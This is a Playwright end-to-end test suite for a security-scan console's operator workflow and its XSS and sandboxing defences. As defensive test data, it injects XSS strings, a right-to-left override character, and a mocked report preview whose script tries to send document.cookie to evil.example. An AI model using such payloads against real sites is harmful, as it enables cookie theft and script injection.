import { createHash } from "node:crypto";

import { expect, test, type Page } from "@playwright/test";

import {
  HEADERS_A,
  HEADERS_B,
  HEADERS_C,
  LAB_HOST,
  LAB_URL,
  setLabHeaders,
  startLab,
  stopLab,
} from "./support/lab";

// The complete operator workflow through the UI, against the live compose
// stack and a temporary lab target (tests/e2e/support/lab.ts):
// project → target + authorization → assessment → scan → findings + triage →
// scan report → retest B → comparison → retest report → retest C.

test.describe.configure({ mode: "serial" });
test.skip(
  !process.env.E2E_BASE_URL,
  "needs the running compose stack and Docker (set E2E_BASE_URL)",
);
// Since Phase 9 M4 every API route except health and login requires a session
// and project membership, and the console cannot sign in until M8 adds the
// browser session (login page, HttpOnly cookie held by the Next.js server).
// Until then this workflow cannot run against a live stack.
test.skip(
  !process.env.E2E_BROWSER_SESSIONS,
  "the API requires authentication (Phase 9 M4); browser sessions arrive in M8",
);

const RUN = Date.now().toString(36);
const UUID = "[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}";
const XSS = '<img src=x onerror="window.__xss=1">';
const RLO = "‮";

const browserRequests: string[] = [];
let dialogs = 0;

function idFrom(page: Page, prefix: string): string {
  const match = new RegExp(`${prefix}/(${UUID})`).exec(page.url());
  if (!match?.[1]) throw new Error(`no ${prefix} id in ${page.url()}`);
  return match[1];
}

async function submit(page: Page, formTestId: string): Promise<void> {
  await page.getByTestId(formTestId).locator('button[type="submit"]').click();
}

/** Reload until `ready` holds (scans and analysis run in the worker). */
async function reloadUntil(page: Page, ready: () => Promise<boolean>, timeoutMs = 240_000) {
  const end = Date.now() + timeoutMs;
  while (Date.now() < end) {
    if (await ready()) return;
    await page.waitForTimeout(2000);
    await page.reload();
  }
  throw new Error("timed out waiting for the worker");
}

async function noScriptRan(page: Page): Promise<void> {
  expect(
    await page.evaluate(() => (window as unknown as { __xss?: number }).__xss),
  ).toBeUndefined();
  expect(dialogs).toBe(0);
}

async function runScan(page: Page, assessmentId: string): Promise<string> {
  await page.goto(`/assessments/${assessmentId}`);
  await submit(page, "launch-scan");
  await page.waitForURL(new RegExp(`/scans/${UUID}$`));
  const scanId = idFrom(page, "/scans");
  await reloadUntil(
    page,
    async () =>
      (await page.getByTestId("analysis-runs").count()) > 0 &&
      (await page.getByTestId("analysis-runs").getByText("Completed").count()) > 0,
  );
  return scanId;
}

async function transition(page: Page, assessmentId: string, action: string, expected: string) {
  await page.goto(`/assessments/${assessmentId}`);
  await submit(page, `${action}-assessment`);
  // The form for this transition disappears once the status changes; the
  // lifecycle status badge is the feedback.
  await expect(page.locator('#lifecycle [data-kind="status"]').first()).toHaveText(expected, {
    timeout: 30_000,
  });
}

async function verifyDownloads(page: Page, kind: string, reportId: string, formats: string[]) {
  const table = page.getByTestId("artifacts-table");
  await expect(table.locator("tbody tr")).toHaveCount(formats.length, { timeout: 180_000 });
  for (const fmt of formats) {
    const sha = (await page.getByTestId(`sha256-${fmt}`).innerText()).trim();
    const response = await page.request.get(`/artifacts/${kind}/${reportId}/${fmt}`);
    expect(response.status()).toBe(200);
    const headers = response.headers();
    expect(headers["content-disposition"]).toMatch(/^attachment; filename="SV-R(T)?-\d{6}\./);
    expect(headers["etag"]).toBe(`"${sha}"`);
    expect(headers["x-content-type-options"]).toBe("nosniff");
    expect(headers["content-security-policy"]).toContain("sandbox");
    const body = await response.body();
    expect(createHash("sha256").update(body).digest("hex")).toBe(sha);
    if (fmt === "pdf") expect(body.subarray(0, 5).toString()).toBe("%PDF-");
  }
}

async function verifySandboxedPreview(page: Page, kind: string, reportId: string) {
  const preview = `/artifacts/${kind}/${reportId}/preview`;
  const frame = page.getByTestId("report-preview");
  await expect(frame).toHaveAttribute("sandbox", "");
  await expect(frame).toHaveAttribute("src", preview);
  const real = await page.request.get(preview);
  expect(real.status()).toBe(200);
  expect(real.headers()["content-security-policy"]).toMatch(/(^|;)\s*sandbox\s*(;|$)/);
  expect(real.headers()["x-frame-options"]).toBe("SAMEORIGIN");

  // Replace the preview with hostile HTML: inside sandbox="" it must not run
  // and must not reach the parent, its storage, cookies or DOM.
  await page.evaluate(() => {
    localStorage.setItem("sv-e2e-marker", "intact");
    document.cookie = "sv_e2e=1; path=/";
  });
  const titleBefore = await page.title();
  await page.route(`**${preview}`, (route) =>
    route.fulfill({
      status: 200,
      contentType: "text/html",
      body:
        "<script>try{parent.document.title='pwned'}catch(e){};" +
        "try{parent.__pwned=1}catch(e){};try{localStorage.setItem('sv-e2e-marker','pwned')}catch(e){};" +
        "try{top.location='http://evil.example/'+document.cookie}catch(e){}</script>" +
        "<p id=hostile>hostile preview</p>",
    }),
  );
  await page.reload();
  await expect(page.getByTestId("report-preview")).toBeVisible();
  await page.waitForTimeout(1500);
  expect(page.url()).not.toContain("evil.example");
  expect(await page.title()).toBe(titleBefore);
  expect(
    await page.evaluate(() => (window as unknown as { __pwned?: number }).__pwned),
  ).toBeUndefined();
  expect(await page.evaluate(() => localStorage.getItem("sv-e2e-marker"))).toBe("intact");
  // Opaque origin: the application cannot reach into the frame either.
  expect(
    await page.evaluate(() => {
      const el = document.querySelector("iframe");
      try {
        return el?.contentDocument === null;
      } catch {
        return true;
      }
    }),
  ).toBe(true);
  await page.unroute(`**${preview}`);
}

test.beforeAll(() => startLab());
test.afterAll(() => stopLab());

test.beforeEach(({ page }) => {
  page.on("request", (request) => browserRequests.push(request.url()));
  page.on("dialog", async (dialog) => {
    dialogs += 1;
    await dialog.dismiss();
  });
});

const state: Record<string, string> = {};

test("project, target and authorization", async ({ page }) => {
  await page.goto("/projects");
  const form = page.getByTestId("create-project");
  await form.locator('[name="name"]').fill(`E2E ${RUN} ${XSS} ${RLO}rlo`);
  await form.locator('[name="description"]').fill(`<script>window.__xss=1</script>\u0007bell`);
  await submit(page, "create-project");
  await page.waitForURL(new RegExp(`/projects/${UUID}$`));
  state.project = idFrom(page, "/projects");
  const h1 = page.locator("h1");
  await expect(h1).toContainText(XSS); // shown as text
  await expect(h1).toContainText("⟨U+202E RLO⟩");
  await expect(page.getByText("⟨U+0007⟩")).toBeVisible();
  await noScriptRan(page);

  await page.goto(`/projects/${state.project}/targets`);
  const t = page.getByTestId("create-target");
  await t.locator('[name="name"]').fill(`Lab ${RUN} ${XSS}`);
  await t.locator('[name="base_url"]').fill(LAB_URL);
  await t.locator('[name="in_scope_hosts"]').fill(LAB_HOST);
  await t.locator('[name="authorized_by"]').fill("Lab Owner");
  await t.locator('[name="reference"]').fill(`LAB-${RUN}`);
  // The acknowledgement is required: without it nothing is sent.
  await submit(page, "create-target");
  expect(page.url()).toContain("/targets");
  await t.locator('[name="acknowledge"]').check();
  await submit(page, "create-target");
  await page.waitForURL(new RegExp(`/targets/${UUID}$`));
  state.target = idFrom(page, "/targets");
  await expect(page.getByText("Authorization is recorded, not verified.").first()).toBeVisible();
  await expect(page.getByText("self-asserted (no platform login yet)").first()).toBeVisible();
  await expect(page.getByTestId("authorization-history").locator("tbody tr")).toHaveCount(1);
  await expect(page.locator("#scope")).toContainText(LAB_HOST);
  await expect(page.locator("#scope a")).toHaveCount(0); // target URLs are not links
  await noScriptRan(page);
});

test("baseline assessment, scan, findings and triage", async ({ page }) => {
  test.setTimeout(10 * 60_000);
  await page.goto(`/targets/${state.target}`);
  await page.getByTestId("create-assessment").locator('[name="name"]').fill("Baseline A");
  await submit(page, "create-assessment");
  await page.waitForURL(new RegExp(`/assessments/${UUID}$`));
  state.a = idFrom(page, "/assessments");

  await transition(page, state.a, "start", "In progress");
  setLabHeaders(HEADERS_A);
  state.scanA = await runScan(page, state.a);

  // Hostile target data (title with markup and U+202E; a header with a script).
  await page.goto(`/scans/${state.scanA}?tab=endpoints`);
  const endpoints = page.getByTestId("scan-endpoints");
  await expect(endpoints).toContainText('<img src=x onerror="window.__xss=1">');
  await expect(endpoints).toContainText("⟨U+202E RLO⟩");
  await page.goto(`/scans/${state.scanA}?tab=evidence`);
  await expect(page.getByLabel("Response headers").first()).toContainText(
    "<script>window.__xss=1</script>",
  );
  await noScriptRan(page);

  await transition(page, state.a, "complete", "Completed");

  await page.goto(`/findings?scan=${state.scanA}`);
  const rows = page.getByTestId("findings-table").locator("tbody tr");
  expect(await rows.count()).toBeGreaterThan(2);
  await expect(page.getByTestId("severity-chart")).toBeVisible();
  await page.locator('tr[data-rule="SV-HDR-003"] a').first().click();
  await page.waitForURL(new RegExp(`/findings/${UUID}$`));
  state.framingFinding = idFrom(page, "/findings");
  await expect(page.getByText("Fingerprint (identity)")).toBeVisible();
  const triage = page.getByTestId("triage");
  await triage.locator('[name="status"]').selectOption("false_positive");
  await triage.locator('[name="reason"]').fill("Framing is handled by the lab proxy.");
  await submit(page, "triage");
  await expect(page.getByText("Triage recorded.")).toBeVisible();
  await expect(page.getByTestId("triage-history").locator("tbody tr")).toHaveCount(1);
  await expect(page.locator("#triage")).toContainText("Triage: False positive");
});

test("scan report: request, artifacts, downloads and sandboxed preview", async ({ page }) => {
  test.setTimeout(5 * 60_000);
  await page.goto(`/assessments/${state.a}`);
  const form = page.getByTestId("request-report");
  await submit(page, "request-report");
  await page.waitForURL(new RegExp(`/reports/${UUID}$`));
  state.report = idFrom(page, "/reports");
  await verifyDownloads(page, "reports", state.report, ["json", "html", "pdf"]);
  await verifySandboxedPreview(page, "reports", state.report);
});

test("retest B: comparison states, dismissal, coverage and retest report", async ({ page }) => {
  test.setTimeout(10 * 60_000);
  await page.goto(`/assessments/${state.a}`);
  await page.getByTestId("create-retest").locator('[name="name"]').fill("Retest B");
  await submit(page, "create-retest");
  await page.waitForURL(new RegExp(`/retests/${UUID}$`));
  state.b = idFrom(page, "/retests");
  await expect(page.locator("#baseline")).toContainText(state.scanA!);

  await transition(page, state.b, "start", "In progress");
  setLabHeaders(HEADERS_B);
  state.scanB = await runScan(page, state.b);

  await page.goto(`/retests/${state.b}`);
  await submit(page, "request-comparison");
  await page.waitForURL(new RegExp(`/comparisons/${UUID}$`)); // 202: new
  state.cmpB = idFrom(page, "/comparisons");
  await reloadUntil(page, async () => (await page.locator("#state-fixed").count()) > 0);

  // Every persisted state has its own section, shown even when empty.
  for (const s of [
    "new",
    "reopened",
    "still_open",
    "unchanged",
    "fixed",
    "dismissed",
    "not_retested",
    "not_comparable",
  ]) {
    await expect(page.locator(`#state-${s}`)).toBeVisible();
    await expect(page.locator(`#state-${s} [data-kind="comparison-state"]`).first()).toHaveText(
      s.toUpperCase(),
    );
  }
  await expect(page.getByTestId("state-chart")).toBeVisible();
  // The false-positive baseline finding is DISMISSED (never FIXED), and its
  // triage at comparison time is shown separately.
  const dismissed = page.locator('#state-dismissed tr[data-rule="SV-HDR-003"]');
  await expect(dismissed).toHaveCount(1);
  await expect(dismissed.locator('[data-kind="comparison-state"]')).toHaveText("DISMISSED");
  await expect(dismissed.locator('[data-kind="triage"]')).toHaveText("Triage: False positive");
  await expect(page.locator('#state-fixed tr[data-rule="SV-HDR-003"]')).toHaveCount(0);
  // FIXED records carry the retest's coverage evidence.
  const fixed = page.locator("#state-fixed tbody tr");
  expect(await fixed.count()).toBeGreaterThan(0);
  for (const row of await fixed.all()) {
    await expect(row.locator('a[href^="/evidence/"]').first()).toBeVisible();
  }
  await fixed.first().locator('a[href^="/evidence/"]').first().click();
  await expect(page.getByText("Captured exchange")).toBeVisible();

  // Comparing the same scan again returns the existing comparison (200).
  await page.goto(`/retests/${state.b}`);
  await submit(page, "request-comparison");
  await page.waitForURL(new RegExp(`/comparisons/${state.cmpB}\\?existing=1$`));
  await expect(page.getByText("already been compared")).toBeVisible();

  // A final retest report needs the retest to be completed (409).
  const report = page.getByTestId("request-retest-report");
  await report.locator('[name="kind"]').selectOption("final");
  await submit(page, "request-retest-report");
  await expect(report.getByRole("alert")).toContainText("assessment_not_completed");

  await transition(page, state.b, "complete", "Completed");
  await page.goto(`/comparisons/${state.cmpB}`);
  const again = page.getByTestId("request-retest-report");
  await again.locator('[name="kind"]').selectOption("final");
  await submit(page, "request-retest-report");
  await page.waitForURL(new RegExp(`/retest-reports/${UUID}$`)); // 202: new
  state.rrB = idFrom(page, "/retest-reports");
  await verifyDownloads(page, "retest-reports", state.rrB, ["json", "html", "pdf"]);
  await verifySandboxedPreview(page, "retest-reports", state.rrB);

  // The JSON artifact carries the comparison states exactly as stored.
  const json = await (await page.request.get(`/artifacts/retest-reports/${state.rrB}/json`)).json();
  const states = Object.fromEntries(
    (json.report.records as { fingerprint: string; state: string }[]).map((r) => [
      r.fingerprint,
      r.state,
    ]),
  );
  expect(Object.values(states)).toContain("dismissed");

  // An identical request returns the existing report (200).
  await page.goto(`/comparisons/${state.cmpB}`);
  const same = page.getByTestId("request-retest-report");
  await same.locator('[name="kind"]').selectOption("final");
  await submit(page, "request-retest-report");
  await page.waitForURL(new RegExp(`/retest-reports/${state.rrB}\\?existing=1$`));
  await expect(page.getByText("already existed")).toBeVisible();
});

test("retest C: reopened findings and the A → B → C lineage", async ({ page }) => {
  test.setTimeout(10 * 60_000);
  await page.goto(`/assessments/${state.b}`);
  await page.getByTestId("create-retest").locator('[name="name"]').fill("Retest C");
  await submit(page, "create-retest");
  await page.waitForURL(new RegExp(`/retests/${UUID}$`));
  state.c = idFrom(page, "/retests");
  await transition(page, state.c, "start", "In progress");
  setLabHeaders(HEADERS_C);
  state.scanC = await runScan(page, state.c);

  await page.goto(`/retests/${state.c}`);
  await submit(page, "request-comparison");
  await page.waitForURL(new RegExp(`/comparisons/${UUID}$`));
  state.cmpC = idFrom(page, "/comparisons");
  await reloadUntil(page, async () => (await page.locator("#state-reopened").count()) > 0);
  const reopened = page.locator("#state-reopened tbody tr");
  expect(await reopened.count()).toBeGreaterThan(0);
  for (const row of await reopened.all()) {
    await expect(row.locator('[data-kind="comparison-state"]')).toHaveText("REOPENED");
    await expect(row).toContainText("previously_fixed");
  }
  await expect(page.locator("#summary")).toContainText(state.cmpB!); // previous comparison

  await page.goto(`/retests/${state.c}`);
  await expect(page.getByTestId("lineage-table").locator("tbody tr")).toHaveCount(3);
  const chart = page.getByTestId("lineage-chart");
  await expect(chart.locator("g[data-position]")).toHaveCount(3);
  await expect(chart.locator("title")).toHaveText("Retest lineage");

  await transition(page, state.c, "complete", "Completed");
  await page.goto(`/comparisons/${state.cmpC}`);
  const form = page.getByTestId("request-retest-report");
  await submit(page, "request-retest-report");
  await page.waitForURL(new RegExp(`/retest-reports/${UUID}$`));
  await verifyDownloads(page, "retest-reports", idFrom(page, "/retest-reports"), [
    "json",
    "html",
    "pdf",
  ]);
});

test("the browser never called the API directly", () => {
  expect(browserRequests.length).toBeGreaterThan(50);
  const offOrigin = browserRequests.filter(
    (url) => !url.startsWith("http://localhost:3000/") && !url.startsWith("data:"),
  );
  expect(offOrigin).toEqual([]);
  expect(browserRequests.some((url) => url.includes(":8000"))).toBe(false);
  expect(dialogs).toBe(0);
});
